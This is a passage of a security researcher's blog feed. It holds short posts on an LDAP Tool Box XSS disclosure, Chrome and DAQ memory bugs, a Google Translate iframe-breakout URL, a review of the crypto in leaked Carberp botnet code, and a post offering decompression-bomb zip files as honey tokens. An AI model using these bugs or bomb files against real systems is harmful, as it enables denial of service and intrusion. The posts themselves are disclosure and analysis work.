<p><a href="https://www.cert.govt.nz/">[4] New Zealand CERT NZ</a></p>

<p><a href="https://www.ncsc.gov.uk/">[5] United Kingdom National Cyber Security Centre (UK
NCSC)</a></p>

<p><a href="https://www.cisa.gov/">[6] United States Cybersecurity and Infrastructure Security Agency
(CISA)</a></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="incident response"/>
    <category term="cybersecurity best practices"/>
    <category term="IOC detection"/>
    <category term="anomaly detection"/>
    <category term="host-based artifacts"/>
    <category term="network-based artifacts"/>
    <category term="threat hunting"/>
    <category term="digital forensics"/>
    <category term="incident mitigation"/>
    <category term="security monitoring"/>
    <category term="incident handling mistakes"/>
    <category term="remediation strategies"/>
    <category term="network segmentation"/>
    <category term="access control"/>
    <category term="backup and recovery"/>
    <category term="SIEM"/>
    <category term="endpoint detection"/>
    <category term="malware analysis"/>
    <category term="user education"/>
    <category term="secure configuration"/>
    <summary type="html"><![CDATA[When addressing potential incidents and applying best practice incident response procedures]]></summary>
  </entry>
  <entry>
    <title type="html">Checkbox AWS assurance testing?</title>
    <link href="https://www.securesql.info/2015/03/20/aws-assurance-checkboxes/" rel="alternate" type="text/html" title="Checkbox AWS assurance testing?"/>
    <published>2015-03-20T00:00:00-07:00</published>
    <updated>2015-03-20T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2015/03/20/aws-assurance-checkboxes</id>
    <content type="html" xml:base="https://www.securesql.info/2015/03/20/aws-assurance-checkboxes/"><![CDATA[<p>A great beta tool to checkbox their AWS infrastructure and account to known
AWS controls. <a href="https://github.com/iSECPartners/Scout2"> Scout2 </a></p>

<blockquote>
  <p>“Scout2 is a security tool that lets AWS administrators asses their
environment’s security posture. Using the AWS API, Scout2 gathers
configuration data for manual inspection and highlights high-risk areas
automatically. Rather than pouring through dozens of pages on the web,
Scout2 supplies a clear view of the attack surface automatically.”</p>
</blockquote>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="AWS security"/>
    <category term="Scout2"/>
    <category term="cloud assurance"/>
    <category term="infrastructure auditing"/>
    <category term="security posture"/>
    <category term="AWS controls"/>
    <category term="configuration assessment"/>
    <category term="cloud compliance"/>
    <summary type="html"><![CDATA[A great beta tool to checkbox their AWS infrastructure and account to known AWS controls. [ Scout2]]></summary>
  </entry>
  <entry>
    <title type="html">Open Source Fairy Dust Datasets</title>
    <link href="https://www.securesql.info/2015/03/20/opensource-vulnerable-metrics-relativity/" rel="alternate" type="text/html" title="Open Source Fairy Dust Datasets"/>
    <published>2015-03-20T00:00:00-07:00</published>
    <updated>2015-03-20T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2015/03/20/opensource-vulnerable-metrics-relativity</id>
    <content type="html" xml:base="https://www.securesql.info/2015/03/20/opensource-vulnerable-metrics-relativity/"><![CDATA[<p>The current list of items I have released and / or made public</p>

<hr />

<h3 id="hack-the-planet"><a href="http://www.hacktheplanet.ninja">Hack the Planet</a></h3>

<p>http://hacktheplanet.ninja/ApplicationLibrary.html</p>

<p>http://hacktheplanet.ninja/CoreLibrary.html</p>

<p>http://hacktheplanet.ninja/Crypto.html</p>

<p>http://hacktheplanet.ninja/Mail.html</p>

<p>http://hacktheplanet.ninja/OS.html</p>

<p>http://hacktheplanet.ninja/SampleOfProjects.html</p>

<p>http://hacktheplanet.ninja/Security.html</p>

<p>http://hacktheplanet.ninja/Time.html</p>

<p>http://hacktheplanet.ninja/WebServer.html</p>

<p>More information how to understand the labels and numbers - <a href="http://securesql.info/hacks/2014/8/22/hacktheplanetninjas-data-sets">http://securesql.info/hacks/2014/8/22/hacktheplanetninjas-data-sets</a></p>

<p>Correlation Ranking - http://web.stanford.edu/~engler/fse2004-feedbackrank.pdf</p>

<p>More coming….</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="open source insecurity"/>
    <category term="machine learning vulnerabilities"/>
    <category term="vulnerability mountain"/>
    <category term="critical infrastructure vulnerabilities"/>
    <summary type="html"><![CDATA[The current list of open source critical infrastructure services vulnerability metrics I have released and / or made public]]></summary>
  </entry>
  <entry>
    <title type="html">LDAP Tool Box vulnerabilities</title>
    <link href="https://www.securesql.info/2014/12/01/ldap-vulnerabilities-exploits/" rel="alternate" type="text/html" title="LDAP Tool Box vulnerabilities"/>
    <published>2014-12-01T00:00:00-08:00</published>
    <updated>2014-12-01T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2014/12/01/ldap-vulnerabilities-exploits</id>
    <content type="html" xml:base="https://www.securesql.info/2014/12/01/ldap-vulnerabilities-exploits/"><![CDATA[<p>This vulnerability allows one to bypass weak XSS filtering / validation on
vulnerable installations of LDAP Tool Box. User interaction is required to
exploit this vulnerability in that the target must open or browse a malicious
link.</p>

<p>The vulnerable weak XSS filtering mechanism will prevent some but not all XSS
injections.  It really depends on the execution context.  Relying on the
htmlentities encoding function is equivalent to using a very weak blacklist.</p>

<p>I have written a proof-of-concept exploit which causes a fake login page, with
corresponding javascript key logger, to render in the victim’s browser.</p>

<p><em><strong>Affected Products</strong></em></p>

<p>All installations of LDAP Tool Box which does not have the <a href="http://tools.ltb-project.org/attachments/591/XSSvalidation.patch">appropriate patch
applied</a></p>

<p>** <em>Remediation</em>**</p>

<p>Until LDAP Tool Box releases an upgraded version, please apply the patch
<a href="http://tools.ltb-
project.org/attachments/591/XSSvalidation.patch">found here</a>.</p>

<p>** <em>Additional information</em>**</p>

<p><a href="http://wiremask.eu/?p=tutorials&amp;id=10">http://wiremask.eu/?p=tutorials&amp;id=10</a></p>

<p><a href="http://tools.ltb-project.org/issues/602">Issue</a></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="LDAP Tool Box"/>
    <category term="XSS vulnerability"/>
    <category term="htmlentities weakness"/>
    <category term="web application security"/>
    <category term="proof of concept exploit"/>
    <category term="client side attacks"/>
    <category term="security patch"/>
    <category term="keylogger"/>
    <category term="vulnerability disclosure"/>
    <summary type="html"><![CDATA[This vulnerability allows one to bypass weak XSS filtering]]></summary>
  </entry>
  <entry>
    <title type="html">How to sell a story - Ira Glass</title>
    <link href="https://www.securesql.info/2014/06/27/storytelling/" rel="alternate" type="text/html" title="How to sell a story - Ira Glass"/>
    <published>2014-06-27T00:00:00-07:00</published>
    <updated>2014-06-27T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2014/06/27/storytelling</id>
    <content type="html" xml:base="https://www.securesql.info/2014/06/27/storytelling/"><![CDATA[<p>“…What nobody tells people who are beginners — and I really wish someone had
told this to me . . . is that all of us who do creative work, we get into it
because we have good taste. For example, you want to make TV because you LOVE
TV. There is stuff that you just LOVE.</p>

<p>So you have really good taste. But you get into this thing where there is this
gap. For the first couple years you are making stuff… but what you’re making
isn’t so good. It’s not that great. It’s trying to be good, it has ambition to
be good, but it’s not. But your taste, the thing that got you into the game,
your taste is still killer. And your taste is good enough that you can tell
that what you’re making is a disappointment to you. It’s still sorta crappy.</p>

<p>A lot of people never get past this phase. They quit. But the thing I would
say to you with all my heart: most everyone I know who does interesting,
creative work, went through years of this. We knew our work didn’t have this
special thing that we wanted it to have. Everybody goes through this.</p>

<p>If you are just starting this phase, still in this phase, getting out of this
phase, you gotta know it’s totally normal and the most important, possible
thing you can do is do a lot of work. Do a huge volume of work. Put yourself
on a deadline so that every week or every month you know you will finish one
story. You create the deadline. It’s best if you have someone waiting for the
work, even if it’s somebody that doesn’t pay you. It is only by going through
a volume of work that you will close that gap, and your work will be as good
as your ambitions.</p>

<p>In my case, I took longer to figure out how to do this than anybody I’ve ever
met. It takes awhile. It’s going to take you awhile. It’s normal to take
awhile. And you just have to fight your way through that….”</p>

<p>http://vimeo.com/24715531</p>

<p>​</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Ira Glass"/>
    <category term="creative process"/>
    <category term="storytelling"/>
    <category term="artistic growth"/>
    <category term="overcoming self doubt"/>
    <category term="creative advice"/>
    <category term="persistence in art"/>
    <category term="closing the gap"/>
    <category term="beginner struggles"/>
    <category term="motivation for creators"/>
    <summary type="html"><![CDATA[If you are just starting this phase, still in this phase, getting out of this phase, you gotta know]]></summary>
  </entry>
  <entry>
    <title type="html">Please donate to a worthy crypto security cause</title>
    <link href="https://www.securesql.info/2014/04/15/openssl-vulnerabilities/" rel="alternate" type="text/html" title="Please donate to a worthy crypto security cause"/>
    <published>2014-04-15T00:00:00-07:00</published>
    <updated>2014-04-15T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2014/04/15/openssl-vulnerabilities</id>
    <content type="html" xml:base="https://www.securesql.info/2014/04/15/openssl-vulnerabilities/"><![CDATA[<p>If you have ever used OpenSSL, <a href="https://www.crowdtilt.com/campaigns/lets-make-sure-heartbleed-doesnt-
happen-again">please donate money to this worthy
cause</a>.  Your donation will go towards security and cryptographic
researchers who are financially (or egotistically) motivated to discover
security-related defects in OpenSSL’s intellectual property.   Trust me,
OpenSSL needs it!!!!!!!!  See the below picture for a simple, secure code
review on <a href="http://www.openssl.org/source/">OpenSSL’s latest release</a>, 1.0.1g.</p>

<p><img src="https://securesql.info/images/OpenSSL101gInSecurity" alt="" /></p>

<p>What we see is typical of an older, open source C / C++ based application.
Overall, there are code quality issues in addition to common C / C++ software
security defects.  Fortunately, some of the bugs require unique situations to
exist.  Unfortunately, as we saw in HeartBleed, other defects are straight
forward and easily exploitable.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="OpenSSL"/>
    <category term="Heartbleed"/>
    <category term="cryptographic security"/>
    <category term="secure code review"/>
    <category term="donate to security"/>
    <category term="open source funding"/>
    <category term="C/C++ vulnerabilities"/>
    <category term="software defects"/>
    <category term="security research"/>
    <summary type="html"><![CDATA[If you have ever used OpenSSL, [please donate money to this worthy cause]]></summary>
  </entry>
  <entry>
    <title type="html">Bug Age - Pattern series</title>
    <link href="https://www.securesql.info/2014/04/07/bug-age-patterns/" rel="alternate" type="text/html" title="Bug Age - Pattern series"/>
    <published>2014-04-07T00:00:00-07:00</published>
    <updated>2014-04-07T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2014/04/07/bug-age-patterns</id>
    <content type="html" xml:base="https://www.securesql.info/2014/04/07/bug-age-patterns/"><![CDATA[<p>I love standards. My blackhat persona says this makes it easy to break into
systems (mono-risk culture.) Everyone must buy the same machine, same
software, same configuration. My whitehat persona says this leads to less
configuration flaws. Then opponents must move further up the stack and delve
into about code insecurity. One would think we would be prepared / situated
when attackers are forced to move onto code insecurity. Mind you, this is a
2-5 years evolution. But 2-5 years is a lot of time preparing for code
insecurity. The challenge is how does one build secure code cost-effectively?
I am amazed at all the clever ways one can break poorly written php / java /
perl / javascript / actionscript/ C / ruby / python code. Software insecurity
is a well understood challenge. I have never met a software developer who
wanted to create insecure code. It is not a soft problem is the sense
programmers write insecure code. But there exist tools (behavioral,
developmental, and thought) to reduce / eliminate classes of vulnerabilities.
Lost long ago were formal proofs. These computing systems formal designed
stuff at a higher level, assigned appropriate interfaces and with some
mathematical confidence show a permutation of interfaces couldn’t be utilized
by a hacker in the right order to enact unexpected behavior. Formal proofs
have disappeared. Ultimately, that is the next problem to solve. The Age of
Bugs is dead. Academia and other hackers have moved into the Age of Systems.
Eventually software developers will move beyond common software
vulnerabilities and utilize mechanisms that eliminate them.  Until then,
software developers have a number of patterns to recognize and formally solve.</p>

<p>In the coming entries, we will cover the following patterns in detail;</p>

<p><strong><em>Code correctness</em></strong>  – incentives to get code right, not secure.<br />
<strong><em>Old code is scary</em></strong>  – threat models change after years of use<br />
** <em>Holistic security</em>**  – All encompassing<br />
** <em>Open source lesson</em>**  – many hands in the kitchen<br />
** <em>Never ending security</em>**  – the never ending story<br />
** <em>Today’s XSS is tomorrow’s CSRF</em>**<br />
** <em>Retire unused code</em>**  – poor financial investment<br />
** <em>Tools are tools</em>**  – nothing more, nothing less</p>

<p>** <em>Lazyness</em>**  - automation</p>

<p>​</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="bug patterns"/>
    <category term="code insecurity"/>
    <category term="secure coding"/>
    <category term="software vulnerabilities"/>
    <category term="formal proofs"/>
    <category term="code correctness"/>
    <category term="legacy code"/>
    <category term="holistic security"/>
    <category term="open source security"/>
    <category term="security automation"/>
    <category term="developer tools"/>
    <summary type="html"><![CDATA[I love standards. My blackhat persona says this makes it easy to break into systems]]></summary>
  </entry>
  <entry>
    <title type="html">Chrome’s V8 double free vulnerability</title>
    <link href="https://www.securesql.info/2014/03/07/chrome-exploit-double-free-v8-engine/" rel="alternate" type="text/html" title="Chrome’s V8 double free vulnerability"/>
    <published>2014-03-07T00:00:00-08:00</published>
    <updated>2014-03-07T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2014/03/07/chrome-exploit-double-free-v8-engine</id>
    <content type="html" xml:base="https://www.securesql.info/2014/03/07/chrome-exploit-double-free-v8-engine/"><![CDATA[<p>Within Chrome’s V8 engine, this was an interesting double free vulnerability I
uncovered. Thank you V8 team for accepting.
<a href="https://code.google.com/p/chromium/issues/detail?id=270320&amp;thanks=270320&amp;ts=1376009332">https://code.google.com/p/chromium/issues/detail?id=270320&amp;thanks=270320&amp;ts=1376009332</a></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Chrome V8"/>
    <category term="double free vulnerability"/>
    <category term="memory corruption"/>
    <category term="Chromium security"/>
    <category term="vulnerability disclosure"/>
    <category term="bug bounty"/>
    <category term="V8 engine"/>
    <category term="browser security"/>
    <summary type="html"><![CDATA[Within Chrome's V8 engine, this was an interesting double free vulnerability I uncovered. Thank you V8 team for accepting.]]></summary>
  </entry>
  <entry>
    <title type="html">NodeJS vulnerabilities - it hurts to look</title>
    <link href="https://www.securesql.info/2013/11/12/nodejs-insecurity/" rel="alternate" type="text/html" title="NodeJS vulnerabilities - it hurts to look"/>
    <published>2013-11-12T00:00:00-08:00</published>
    <updated>2013-11-12T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2013/11/12/nodejs-insecurity</id>
    <content type="html" xml:base="https://www.securesql.info/2013/11/12/nodejs-insecurity/"><![CDATA[<p>Background:</p>

<p>“<strong>Node.js</strong>  is a server-side <a href="http://en.wikipedia.org/wiki/Software_system">software
system</a> designed for writing
<a href="http://en.wikipedia.org/wiki/Scalability">scalable</a> Internet applications,
notably <a href="http://en.wikipedia.org/wiki/Web_server">web
servers</a>.<a href="http://en.wikipedia.org/wiki/Nodejs#cite_note-1">[1]</a>
Programs are written on the server side in
<a href="http://en.wikipedia.org/wiki/JavaScript">JavaScript</a>, using <a href="http://en.wikipedia.org/wiki/Event-driven_architecture">event-
driven</a>, <a href="http://en.wikipedia.org/wiki/Asynchronous_I/O">asynchronous
I/O</a> to minimize
<a href="http://en.wikipedia.org/wiki/Overhead_\(computing\)">overhead</a> and maximize
<a href="http://en.wikipedia.org/wiki/Scalability">scalability</a>.<a href="http://en.wikipedia.org/wiki/Nodejs#cite_note-2">[2]</a></p>

<p>Node.js contains a built-in HTTP server library, making it possible to run a
web server without the use of external software, such as
<a href="http://en.wikipedia.org/wiki/Apache_\(web_server\)">Apache</a>
or<a href="http://en.wikipedia.org/wiki/Lighttpd">Lighttpd</a>, and allowing more control
of how the web server works….” - Wikipedia .   Essentially Node.js is a
wrapper around Chrome’s V8 javascript engine.   This wrapper allows a
javascript programmer to write javascript on the front-end and backend.  I am
not sure why someone would want to write javascript on the backend but ok,
sure.</p>

<p>Vulnerabilities:</p>

<p>There are too many vulnerabilities for me to dig through and start pointing
out.  So instead of talking about each vulnerability, below is the
vulnerability class pie.</p>

<p><img src="https://securesql.info/images/NodeJSVulns.png.avif" alt="" /></p>

<p>Vulnerability pie</p>

<p>Node.js instances publicly available and indexed by Shodan: <a href="http://www.shodanhq.com/search?q=server%3Anode.js">~550
servers</a>.</p>

<p>Node.js source code is <a href="https://github.com/joyent/node">publicly available at
Github</a>.</p>

<p>Good luck and happy vulnerability hunting.</p>

<p>Solutions:</p>

<p>Defensive coding is a must.</p>

<p>Third party software packages need to be reviewed for vulnerabilities.</p>

<p>Treat Node.js as if it were untrusted software handling trusted data.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="NodeJS"/>
    <category term="JavaScript security"/>
    <category term="backend vulnerabilities"/>
    <category term="vulnerability classes"/>
    <category term="defensive coding"/>
    <category term="third party package review"/>
    <category term="Shodan"/>
    <category term="open source security"/>
    <category term="NodeJS hardening"/>
    <summary type="html"><![CDATA[Background]]></summary>
  </entry>
  <entry>
    <title type="html">Google Translate</title>
    <link href="https://www.securesql.info/2013/07/31/google-translate-breakout/" rel="alternate" type="text/html" title="Google Translate"/>
    <published>2013-07-31T00:00:00-07:00</published>
    <updated>2013-07-31T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2013/07/31/google-translate-breakout</id>
    <content type="html" xml:base="https://www.securesql.info/2013/07/31/google-translate-breakout/"><![CDATA[<p>http://www.google.co.uk/translate?hl=en&amp;u=+++mn6i0.tk+%0A%0A++</p>

<p>Background:</p>

<p><strong>“…Google Translate</strong>  is a <a href="http://en.wikipedia.org/wiki/Gratis">free</a>
<a href="http://en.wikipedia.org/wiki/Statistical_machine_translation">statistical</a>
multilingual <a href="http://en.wikipedia.org/wiki/Machine_translation">machine-
translation</a> service
provided by <a href="http://en.wikipedia.org/wiki/Google">Google Inc.</a> to translate
written text from one language into another. ..”  - Wikipedia .</p>

<p>Think of Translate like Douglas Adam’s
<a href="http://en.wikipedia.org/wiki/Babel_fish_\(The_Hitchhiker%27s_Guide_to_the_Galaxy\)#Babel_fish">babelfish</a>,
but in an online, text form.</p>

<p>Vulnerability:</p>

<p>The former vulnerability is rather simple.  After a few redirects to fool
anti-fraud mechanisms, the translated website pops out of Translate’s iframe
and redirects the user to a website or content of their choosing.</p>

<p>Solution:</p>

<p>One may use <a href="http://www.html5rocks.com/en/tutorials/security/sandboxed-iframes/">HTML5-sandbox
iframes</a>
to prevent the top level hijacking.  Google engineers implemented HTML5 to
mitigate the vulnerability.  But in the interests of those web developers who
utilize Flash, Silverlight and other interesting development tools, Translate
enables translators to disable “Translated in Safe Mode.”  This results in
allowing the translator to slit their throat.  To each their own.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Google Translate"/>
    <category term="web vulnerability"/>
    <category term="iframe hijacking"/>
    <category term="redirect exploit"/>
    <category term="HTML5 sandbox"/>
    <category term="web security"/>
    <category term="safe mode"/>
    <category term="security mitigation"/>
    <summary type="html"><![CDATA[the translated website pops out of Google Translate's iframe and redirects the user to a website or content of their choosing]]></summary>
  </entry>
  <entry>
    <title type="html">Carberp Vulnerabilities Cc Pie</title>
    <link href="https://www.securesql.info/2013/06/27/carberp-vulnerabilities-cc-pie/" rel="alternate" type="text/html" title="Carberp Vulnerabilities Cc Pie"/>
    <published>2013-06-27T00:00:00-07:00</published>
    <updated>2013-06-27T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2013/06/27/carberp-vulnerabilities-cc-pie</id>
    <content type="html" xml:base="https://www.securesql.info/2013/06/27/carberp-vulnerabilities-cc-pie/"><![CDATA[<p>I logged into Reddit this morning and observed Carberp’s source code was
released into the public domain.  Awesome.  Time to break “new” software and
responsibly handle the botnets.  Last week, the 2.4+ GB svn repository was
placed into a password protected zip file.  <a href="https://threatpost.com/carberp-source-code-leaked/">Earlier this week, someone shared
the zip file’s password.</a></p>

<p>After acquiring the zip file and credential, I unpacked the zip file in a
clean VM and started to poke around in the repository.  The project is an
interesting read.  The project and related code is full fledged, feature rich
with sizeable complexity and interdependencies.  With the immature svn
commits, and lacking defensive, rugged coding techiniques, it is clear their
internal SDL is lacking.  As typical, complexity is the enemy of security.
When secure coding practices aren’t followed,  underground crackers are just
as affected as professional programmers.  The code looks like a typical
software project with paying customers, regular updates, new features, and
competitor espionage.   I was astonished by the sheer numbers and severity of
the application security vulnerabilities I discovered in the software.   As I
dig deeper into the source code and various comments, I will write additional
blog posts on each area.</p>

<p>To wet your appetite, let’s look at the project’s encryption implementations.</p>

<p>The secret sauce for zombies and C&amp;C encryption algorithm is PHP’s
<a href="http://php.net/manual/en/function.openssl-seal.php">openssl_seal</a> and
<a href="http://php.net/manual/en/function.openssl-private-
encrypt.php">openssl_private_encrypt</a> .  PHP’s openssl_seal utilizes RC4.  While specific RC4
implementations are considered by some to be “good enough,” I will point out
this observation: NIST SP 800-52 doesn’t allow RC4 nor MD5 because they are
not FIPS-approved algorithms.  Auditing Carberp’s implementation doesn’t lead
credence to RC4 being setup securely.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $publickey = openssl_get_publickey(is_file(OPEN_SSL_PUBKEY_PATH)? file_get_contents(OPEN_SSL_PUBKEY_PATH) : OPEN_SSL_PUBKEY_PATH);

  // Encrypt

  openssl_seal($plain, $crypttext, $ekey, array($publickey));

  openssl_free_key($publickey);
</code></pre></div></div>

<p>Where RSA is utilized, there is inadequate padding involved.  Hence weakening
the encryption.  In this specific case, the RSA algorithm is used by PHP’s
openssl_private_encrypt function but doesn’t use OAEP padding.  Implementation
fail.</p>

<p>openssl_private_encrypt($_POST[‘domains’], $hosts, $keys[‘priv’]);</p>

<p>Development’s favorite hash is md5.  I have found over 130 md5 uses through
various components.  FYI: md5 is a weak cryptographic hash known to not
guarantee integrity and should not be used in security critical contexts.
Malware is used in security critical contexts.  Enough said.</p>

<p>Malicious executables are a simple md5 hash with a random number added to it.</p>

<p>$fname = md5($md5 . time() . mt_rand()) . ‘.exe’;</p>

<p>Not computationally hard to reverse engineer and write signatures to detect
carberp executables.</p>

<p>In the jabber communication channels, cnonces are generated with a base 64
encoded, unique md5 hash of a random number.  Complexity is the enemy here.
The weakest chain is that the system relies on md5.  Effectively rendering the
magical base 64 encoding and randon number generation nonce no better than a
typical md5 hash generated with a weak random number generator.</p>

<p>// better generate a cnonce, maybe it’s needed</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            $decoded['cnonce'] = bas
</code></pre></div></div>

<p>base64_encode(md5(uniqid(mt_rand(), true)));</p>

<p>The control panel user’s credentials are stored in a md5 hash.  It is worth
mentioning it is plausible to take down a command center by submitting POSTs
with computationally complex passwords which forces needless and expensive cpu
calculations.  One’s mileage may vary.  I suspect one will suck up all
available web server threads long before php’s md5 hash function will clobber
the cpu.</p>

<p>$pass = md5($_POST[‘pass’]);</p>

<p>I understand implementing cryptography is hard but it isn’t this hard.  I
can’t wait to dive deep into the code.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Carberp"/>
    <category term="malware analysis"/>
    <category term="cryptographic vulnerabilities"/>
    <category term="RC4 encryption"/>
    <category term="md5 weaknesses"/>
    <category term="openssl misuse"/>
    <category term="application security"/>
    <category term="botnet source code"/>
    <category term="secure coding"/>
    <category term="PHP security"/>
    <summary type="html"><![CDATA[I logged into Reddit this morning and observed Carberp]]></summary>
  </entry>
  <entry>
    <title type="html">Random thought for an exploding honey token</title>
    <link href="https://www.securesql.info/2013/06/27/exploding-honey-tokens/" rel="alternate" type="text/html" title="Random thought for an exploding honey token"/>
    <published>2013-06-27T00:00:00-07:00</published>
    <updated>2013-06-27T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2013/06/27/exploding-honey-tokens</id>
    <content type="html" xml:base="https://www.securesql.info/2013/06/27/exploding-honey-tokens/"><![CDATA[<p>I remember when Nuxi and I would create computationally compact compressed
files and see which mail servers would attempt to inspect the contents.
Typically, the MTA would fail over due to lacking heap space, heavy swapping,
insanely large disk IO, and other resource utilization problems.  Besides,
during the school year, exploding the mail gateways was a great way to cause
the university’s mail server to go down and buy a few day’s extra time.  So
why not cause the same reckless behavior, but cause a large blip to happen
when an inside actor attempts to inspect a honey token?</p>

<p>Name the compressed file CreditCard_Customers.zip , <insert juicy="" file="" name="">.zip, etc…. Then place it somewhere available for the intended audience.
Or somewhere not available.  For instance, put it in the confidential file
share.  Then watch asset’s system logs for resource utilization errors related
to unpacking a 35 PB zip file.  Or see if someone attempts to email it to
their personal email address (assuming the MTA will cough and die when
inspection occurs.)  You did make your MTA rugged, right?</insert></p>

<p><a href="/s/42PBSizeCompact.zip">Here are</a> <a href="/s/selfgzMassExplosionUnpacked.gz">two test
files</a><a href="/s/42PBSizeCompact.zip">​</a>.  Modify
to your liking.</p>

<p>​​</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="honey tokens"/>
    <category term="compressed file attacks"/>
    <category term="mail server vulnerabilities"/>
    <category term="resource exhaustion"/>
    <category term="insider threat detection"/>
    <category term="security experimentation"/>
    <category term="MTA inspection"/>
    <category term="system logs monitoring"/>
    <summary type="html"><![CDATA[I remember when Nuxi and I would create computationally compact compressed files and see which mail servers would attempt to inspect the contents. Typically, the MTA would fail over due]]></summary>
  </entry>
  <entry>
    <title type="html">Apache Batik parse double vulnerability</title>
    <link href="https://www.securesql.info/2013/06/23/apache-batik-double-vulnerability/" rel="alternate" type="text/html" title="Apache Batik parse double vulnerability"/>
    <published>2013-06-23T00:00:00-07:00</published>
    <updated>2013-06-23T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2013/06/23/apache-batik-double-vulnerability</id>
    <content type="html" xml:base="https://www.securesql.info/2013/06/23/apache-batik-double-vulnerability/"><![CDATA[<p>It is interesting to see Batik’s parse double vulnerability exist to this day.
Anyone want to crash Opera or popular, open source software?</p>

<p>https://issues.apache.org/jira/browse/BATIK-1023</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Batik vulnerability"/>
    <category term="parse double bug"/>
    <category term="Apache Batik"/>
    <category term="Opera crash"/>
    <category term="open source vulnerabilities"/>
    <category term="software security issues"/>
    <summary type="html"><![CDATA[It is interesting to see Batik's parse double vulnerability exist to this day. Anyone want to crash Opera or popular, open source software]]></summary>
  </entry>
  <entry>
    <title type="html">DAQ buffer overflows</title>
    <link href="https://www.securesql.info/2013/06/22/cisco-sourcefire-snort-exploits/" rel="alternate" type="text/html" title="DAQ buffer overflows"/>
    <published>2013-06-22T00:00:00-07:00</published>
    <updated>2013-06-22T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2013/06/22/cisco-sourcefire-snort-exploits</id>
    <content type="html" xml:base="https://www.securesql.info/2013/06/22/cisco-sourcefire-snort-exploits/"><![CDATA[<p>What we are looking at are two simple types of buffer overflows.</p>

<p>sf_optimize.c</p>

<p>Line 2056 -&gt; edges allocated.</p>

<p>Line 2098 -&gt; edges assignment</p>

<p>So if we have a buffer size of 0 bytes, a write length of 160542648 bytes;
what we see is edges.$offset is 0.  i is 20067830.  Which writes outside the
bounds of edges.</p>

<p>sf_optimize.c</p>

<p>Line 2056 -&gt; edges allocated.</p>

<p>Line 2100 -&gt; edges assignment</p>

<p>So if we have a buffer size of 0 bytes, a write length of  160542648 bytes;
what we see is edges.$offset is 0.  n_blocks is 0.  i is 20067830.  Which
writes outside the bounds of edges.</p>

<p>Off-by-one</p>

<p>daq_common.h: Line 194, Verdicts is declared.</p>

<p>daq_dump.c: Line 164, assigment to impl via stats.verdicts</p>

<p>So we have a buffer size of 48 bytes.  The write length will be 56 bytes. We
end up with verdicts of 6.  Which writes one location past the bounds of
verdicts.</p>

<p>-————————-</p>

<p>DAQ version:</p>

<p>The latest stable version available on <a href="http://snort.com/snort-downloads">snort.com/snort-
downloads</a> (
<a href="http://www.snort.org/downloads/2311">http://www.snort.org/downloads/2311</a> )
version 2.0.0 .</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="buffer overflows"/>
    <category term="software vulnerabilities"/>
    <category term="code analysis"/>
    <category term="security bugs"/>
    <category term="DAQ software"/>
    <category term="off-by-one error"/>
    <category term="programming errors"/>
    <summary type="html"><![CDATA[Sourcefire and snort vulnerabilities allow remote code execution]]></summary>
  </entry>
  <entry>
    <title type="html">Startup Comp Structure</title>
    <link href="https://www.securesql.info/2013/06/05/international-contract-negotation-tips/" rel="alternate" type="text/html" title="Startup Comp Structure"/>
    <published>2013-06-05T00:00:00-07:00</published>
    <updated>2013-06-05T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2013/06/05/international-contract-negotation-tips</id>
    <content type="html" xml:base="https://www.securesql.info/2013/06/05/international-contract-negotation-tips/"><![CDATA[<p>You’ve decided to start a company. Your business plan is based on sound
strategy and thorough market research. Your background and training have
prepared you for the challenge. Now you must assemble the quality management
team that venture investors demand. So you begin the search for a topflight
engineer to head product development and a seasoned manager to handle
marketing, sales, and distribution.</p>

<p>Attracting these executives is easier said than done. You’ve networked your
way to just the marketing candidate you need: a vice president with the right
industry experience and an aggressive business outlook. But she makes $100,000
a year in a secure job at a large company. You can’t possibly commit that much
cash, even if you do raise outside capital. How do you structure a
compensation package that will lure her away? How much cash is reasonable? How
much and what type of stock should the package include? Is there any way to
match the array of benefits—retirement plans, child-care assistance, savings
programs—her current employer provides? In short, what kind of compensation
and benefits program will attract, motivate, and retain this marketing vice
president and other key executives while not jeopardizing the fragile finances
of your startup business?</p>

<p>Selecting appropriate compensation and benefits policies is a critical
challenge for companies of all sizes. But never are the challenges more
difficult—or the stakes higher—than when a company first takes shape. Startups
must strike a delicate balance. Unrealistically low levels of cash
compensation weaken their ability to attract quality managers. Unrealistically
high levels of cash compensation can turn off potential investors and, in
extreme cases, threaten the solvency of the business. How to proceed?</p>

<p>First, be realistic about the limitations. There is simply no way that a
company just developing a prototype or shipping product for less than a year
or generating its first black ink after several money-losing years of building
the business can match the current salaries and benefits offered by
established competitors. At the same time, there are real advantages to being
small. Without an entrenched personnel bureaucracy and long-standing
